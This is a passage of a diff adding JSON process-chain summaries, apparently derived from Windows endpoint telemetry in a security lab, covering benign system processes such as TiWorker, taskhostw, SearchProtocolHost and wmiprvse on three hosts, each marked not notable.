+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.402_none_7e502ee34cd6a6f5\\TiWorker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0036",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:37:54.055000+00:00",
+  "end": "2019-05-14 22:37:54.549000+00:00",
+  "duration_s": 0.5,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 37,
+  "events_by_type": {
+   "image_load": 32,
+   "registry_event": 3,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe NGCKeyPregen"
+  ]
+ },
+ {
+  "chain_id": "CH-0037",
+  "host": "ACCT001",
+  "user": "SHIRE\\lrodriguez",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:38:05.657000+00:00",
+  "end": "2019-05-14 22:38:06.786000+00:00",
+  "duration_s": 1.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 31,
+  "events_by_type": {
+   "image_load": 29,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe Install $(Arg0)"
+  ]
+ },
+ {
+  "chain_id": "CH-0038",
+  "host": "ACCT001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "trustedinstaller.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:38:05.717000+00:00",
+  "end": "2019-05-14 22:40:07.778000+00:00",
+  "duration_s": 122.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 29,
+  "events_by_type": {
+   "image_load": 24,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => trustedinstaller.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\servicing\\TrustedInstaller.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0039",
+  "host": "ACCT001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "tiworker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:38:05.893000+00:00",
+  "end": "2019-05-14 22:40:07.922000+00:00",
+  "duration_s": 122.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 51,
+  "events_by_type": {
+   "image_load": 43,
+   "registry_event": 5,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => tiworker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.402_none_7e502ee34cd6a6f5\\TiWorker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0040",
+  "host": "IT001",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "sppsvc.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:39:52.105000+00:00",
+  "end": "2019-05-14 22:40:22.387000+00:00",
+  "duration_s": 30.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 44,
+  "events_by_type": {
+   "image_load": 38,
+   "registry_event": 2,
+   "process_access": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => sppsvc.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\sppsvc.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0041",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:41:27.720000+00:00",
+  "end": "2019-05-14 22:41:29.744000+00:00",
+  "duration_s": 2.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 37,
+  "events_by_type": {
+   "image_load": 32,
+   "registry_event": 3,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe NGCKeyPregen"
+  ]
+ },
+ {
+  "chain_id": "CH-0042",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchprotocolhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 22:41:52.493000+00:00",
+  "end": "2019-05-14 22:43:41.466000+00:00",
+  "duration_s": 109.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 48,
+  "events_by_type": {
+   "image_load": 42,
+   "registry_event": 4,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchprotocolhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe26_ Global\\UsGthrCtrlFltPipeMssGthrPipe26 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6"
+  ]
+ },
+ {
+  "chain_id": "CH-0043",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "wmiprvse.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:41:52.629000+00:00",
+  "end": "2019-05-14 22:43:32.511000+00:00",
+  "duration_s": 99.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 124,
+  "events_by_type": {
+   "image_load": 92,
+   "registry_event": 16,
+   "pipe_event": 14,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => wmiprvse.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0044",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchfilterhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 22:41:52.978000+00:00",
+  "end": "2019-05-14 22:43:41.472000+00:00",
+  "duration_s": 108.5,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 31,
+  "events_by_type": {
+   "image_load": 28,
+   "process_create": 1,
+   "registry_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchfilterhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 768 772 780 8192 776 "
+  ]
+ },
+ {
+  "chain_id": "CH-0045",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "trustedinstaller.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:42:02.697000+00:00",
+  "end": "2019-05-14 22:45:01.744000+00:00",
+  "duration_s": 179.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 29,
+  "events_by_type": {
+   "image_load": 24,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => trustedinstaller.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\servicing\\TrustedInstaller.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0046",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "tiworker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:42:02.826000+00:00",
+  "end": "2019-05-14 22:45:01.740000+00:00",
+  "duration_s": 178.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 58,
+  "events_by_type": {
+   "image_load": 43,
+   "registry_event": 11,
+   "process_access": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => tiworker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.402_none_7e502ee34cd6a6f5\\TiWorker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0047",
+  "host": "IT001",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "gpupdate.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:43:00.104000+00:00",
+  "end": "2019-05-14 22:43:06.351000+00:00",
+  "duration_s": 6.2,
+  "n_processes": 2,
+  "max_depth": 1,
+  "n_events": 54,
+  "events_by_type": {
+   "image_load": 49,
+   "process_create": 2,
+   "process_terminate": 2,
+   "process_access": 1
+  },
+  "narrative": "svchost.exe => gpupdate.exe -> conhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "gpupdate.exe /target:user",
+   "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+  ]
+ },
+ {
+  "chain_id": "CH-0048",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:43:00.105000+00:00",
+  "end": "2019-05-14 22:43:00.659000+00:00",
+  "duration_s": 0.6,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 31,
+  "events_by_type": {
+   "image_load": 29,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe Install $(Arg0)"
+  ]
+ },
+ {
+  "chain_id": "CH-0049",
+  "host": "IT001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:43:00.248000+00:00",
+  "end": "2019-05-14 22:53:00.306000+00:00",
+  "duration_s": 600.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 61,
+  "events_by_type": {
+   "image_load": 54,
+   "pipe_event": 3,
+   "network_connect": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [
+   "172.18.39.5:389 x2"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc"
+  ]
+ },
+ {
+  "chain_id": "CH-0050",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchprotocolhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 22:45:52.366000+00:00",
+  "end": "2019-05-14 22:47:41.464000+00:00",
+  "duration_s": 109.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 35,
+  "events_by_type": {
+   "image_load": 32,
+   "process_create": 1,
+   "registry_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchprotocolhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe27_ Global\\UsGthrCtrlFltPipeMssGthrPipe27 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6"
+  ]
+ },
+ {
+  "chain_id": "CH-0051",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchfilterhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 22:45:52.508000+00:00",
+  "end": "2019-05-14 22:47:41.469000+00:00",
+  "duration_s": 109.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 25,
+  "events_by_type": {
+   "image_load": 23,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchfilterhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 768 772 780 8192 776 "
+  ]
+ },
+ {
+  "chain_id": "CH-0052",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "logonui.exe",
+  "root_parent": "winlogon.exe",
+  "start": "2019-05-14 22:47:59.999000+00:00",
+  "end": "2019-05-14 22:51:41.385000+00:00",
+  "duration_s": 221.4,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 284,
+  "events_by_type": {
+   "image_load": 139,
+   "registry_event": 129,
+   "other": 12,
+   "process_create": 1,
+   "process_access": 1,
+   "pipe_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "winlogon.exe => logonui.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"LogonUI.exe\" /flags:0x0 /state0:0xa3c00055 /state1:0x41c64e6d"
+  ]
+ },
+ {
+  "chain_id": "CH-0053",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:48:01.396000+00:00",
+  "end": "2019-05-14 22:48:02.315000+00:00",
+  "duration_s": 0.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 29,
+  "events_by_type": {
+   "image_load": 25,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe KEYROAMING"
+  ]
+ },
+ {
+  "chain_id": "CH-0054",
+  "host": "ACCT001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchprotocolhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 22:48:49.720000+00:00",
+  "end": "2019-05-14 22:50:46.321000+00:00",
+  "duration_s": 116.6,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 47,
+  "events_by_type": {
+   "image_load": 42,
+   "registry_event": 3,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchprotocolhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe5_ Global\\UsGthrCtrlFltPipeMssGthrPipe5 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6.0"
+  ]
+ },
+ {
+  "chain_id": "CH-0055",
+  "host": "ACCT001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchfilterhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 22:48:49.758000+00:00",
+  "end": "2019-05-14 22:50:46.326000+00:00",
+  "duration_s": 116.6,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 25,
+  "events_by_type": {
+   "image_load": 23,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchfilterhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 780 784 792 8192 788 "
+  ]
+ },
+ {
+  "chain_id": "CH-0056",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "dmclient.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:50:52.990000+00:00",
+  "end": "2019-05-14 22:50:57.090000+00:00",
+  "duration_s": 4.1,
+  "n_processes": 2,
+  "max_depth": 1,
+  "n_events": 74,
+  "events_by_type": {
+   "image_load": 66,
+   "registry_event": 3,
+   "process_create": 2,
+   "process_terminate": 2,
+   "process_access": 1
+  },
+  "narrative": "svchost.exe => dmclient.exe -> conhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\dmclient.exe utcwnf",
+   "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+  ]
+ },
+ {
+  "chain_id": "CH-0057",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:51:19.048000+00:00",
+  "end": "2019-05-14 22:59:48.187000+00:00",
+  "duration_s": 509.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 30,
+  "events_by_type": {
+   "image_load": 25,
+   "process_access": 4,
+   "process_create": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s seclogon"
+  ]
+ },
+ {
+  "chain_id": "CH-0058",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:51:20.246000+00:00",
+  "end": "2019-05-14 22:52:28.092000+00:00",
+  "duration_s": 67.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 72,
+  "events_by_type": {
+   "image_load": 68,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:App.AppXemn3t55segp7q92mwd35v2a5rk5mvwyz.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0059",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:51:20.314000+00:00",
+  "end": "2019-05-14 22:56:20.607000+00:00",
+  "duration_s": 300.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 27,
+  "events_by_type": {
+   "image_load": 24,
+   "process_create": 1,
+   "file_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\svchost.exe -k wsappx -p -s ClipSVC"
+  ]
+ },
+ {
+  "chain_id": "CH-0060",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "hxtsr.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:51:20.427000+00:00",
+  "end": "2019-05-14 22:51:28.236000+00:00",
+  "duration_s": 7.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 133,
+  "events_by_type": {
+   "registry_event": 66,
+   "image_load": 64,
+   "process_create": 1,
+   "file_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => hxtsr.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Program Files\\WindowsApps\\microsoft.windowscommunicationsapps_16005.11425.20190.0_x64__8wekyb3d8bbwe\\HxTsr.exe\" -ServerName:Hx.IPC.Server"
+  ]
+ },
+ {
+  "chain_id": "CH-0061",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "wmiprvse.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:51:23.466000+00:00",
+  "end": "2019-05-14 22:53:53.684000+00:00",
+  "duration_s": 150.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 97,
+  "events_by_type": {
+   "image_load": 78,
+   "registry_event": 11,
+   "pipe_event": 6,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => wmiprvse.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0062",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "runtimebroker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:51:24.937000+00:00",
+  "end": "2019-05-14 22:52:08.288000+00:00",
+  "duration_s": 43.4,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 58,
+  "events_by_type": {
+   "image_load": 51,
+   "process_access": 5,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => runtimebroker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0063",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "runtimebroker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:51:25.641000+00:00",
+  "end": "2019-05-14 22:52:58.091000+00:00",
+  "duration_s": 92.5,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 151,
+  "events_by_type": {
+   "process_access": 83,
+   "image_load": 52,
+   "registry_event": 6,
+   "file_create": 5,
+   "other": 2,
+   "process_create": 1,
+   "pipe_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => runtimebroker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0064",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:51:41.369000+00:00",
+  "end": "2019-05-14 22:51:41.544000+00:00",
+  "duration_s": 0.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 29,
+  "events_by_type": {
+   "image_load": 25,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe KEYROAMING"
+  ]
+ },
+ {
+  "chain_id": "CH-0065",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:51:41.524000+00:00",
+  "end": "2019-05-14 22:52:44.014000+00:00",
+  "duration_s": 62.5,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 104,
+  "events_by_type": {
+   "image_load": 90,
+   "registry_event": 12,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0066",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:51:42.016000+00:00",
+  "end": "2019-05-14 22:52:43.435000+00:00",
+  "duration_s": 61.4,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 73,
+  "events_by_type": {
+   "image_load": 63,
+   "registry_event": 8,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0067",
+  "host": "IT001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchprotocolhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 22:52:15.663000+00:00",
+  "end": "2019-05-14 22:54:27.510000+00:00",
+  "duration_s": 131.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 35,
+  "events_by_type": {
+   "image_load": 32,
+   "process_create": 1,
+   "registry_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchprotocolhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe23_ Global\\UsGthrCtrlFltPipeMssGthrPipe23 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6"
+  ]
+ },
+ {
+  "chain_id": "CH-0068",
+  "host": "IT001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchfilterhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 22:52:15.701000+00:00",
+  "end": "2019-05-14 22:54:27.515000+00:00",
+  "duration_s": 131.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 25,
+  "events_by_type": {
+   "image_load": 23,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchfilterhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 768 772 780 8192 776 "
+  ]
+ },
+ {
+  "chain_id": "CH-0069",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "consent.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:52:16.282000+00:00",
+  "end": "2019-05-14 22:52:18.993000+00:00",
+  "duration_s": 2.7,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 273,
+  "events_by_type": {
+   "registry_event": 175,
+   "image_load": 95,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => consent.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "consent.exe 2260 11328 0000023B598A9080"
+  ]
+ },
+ {
+  "chain_id": "CH-0070",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "dllhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:52:18.884000+00:00",
+  "end": "2019-05-14 22:52:24.080000+00:00",
+  "duration_s": 5.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 26,
+  "events_by_type": {
+   "image_load": 23,
+   "process_create": 1,
+   "registry_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => dllhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}"
+  ]
+ },
+ {
+  "chain_id": "CH-0071",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "dllhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:52:19.080000+00:00",
+  "end": "2019-05-14 22:52:24.192000+00:00",
+  "duration_s": 5.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 24,
+  "events_by_type": {
+   "image_load": 21,
+   "process_create": 1,
+   "registry_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => dllhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}"
+  ]
+ },
+ {
+  "chain_id": "CH-0072",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "wmiprvse.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:54:12.233000+00:00",
+  "end": "2019-05-14 22:56:30.746000+00:00",
+  "duration_s": 138.5,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 60,
+  "events_by_type": {
+   "image_load": 38,
+   "registry_event": 20,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => wmiprvse.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
